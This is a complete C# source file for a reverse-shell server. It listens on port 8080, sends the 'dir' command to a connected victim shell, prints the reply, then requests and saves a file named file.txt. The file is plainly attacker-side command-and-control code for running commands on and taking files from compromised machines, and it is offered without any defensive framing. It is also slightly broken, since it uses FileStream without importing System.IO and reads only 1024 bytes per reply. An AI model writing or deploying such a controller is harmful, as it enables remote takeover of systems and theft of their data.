using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellServer
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create a new socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to a local endpoint
            IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Any, 8080);
            socket.Bind(localEndPoint);

            // Listen for incoming connections
            socket.Listen(1);

            Console.WriteLine("Waiting for incoming connections...");

            // Accept an incoming connection
            Socket clientSocket = socket.Accept();

            Console.WriteLine("Connected to reverse shell!");

            // Send a command to the reverse shell
            byte[] commandBuffer = Encoding.ASCII.GetBytes("dir");
            clientSocket.Send(commandBuffer);

            // Receive the output from the reverse shell
            byte[] outputBuffer = new byte[1024];
            int outputLength = clientSocket.Receive(outputBuffer);
            string output = Encoding.ASCII.GetString(outputBuffer, 0, outputLength);

            Console.WriteLine(output);

            // Request a file transfer
            byte[] fileRequestBuffer = Encoding.ASCII.GetBytes("download file.txt");
            clientSocket.Send(fileRequestBuffer);

            // Receive the file data from the reverse shell
            byte[] fileBuffer = new byte[1024];
            int fileLength = clientSocket.Receive(fileBuffer);

            // Save the file to disk
            FileStream fileStream = new FileStream("file.txt", FileMode.Create);
            fileStream.Write(fileBuffer, 0, fileLength);
            fileStream.Close();

            Console.WriteLine("File transfer complete!");
        }
    }
}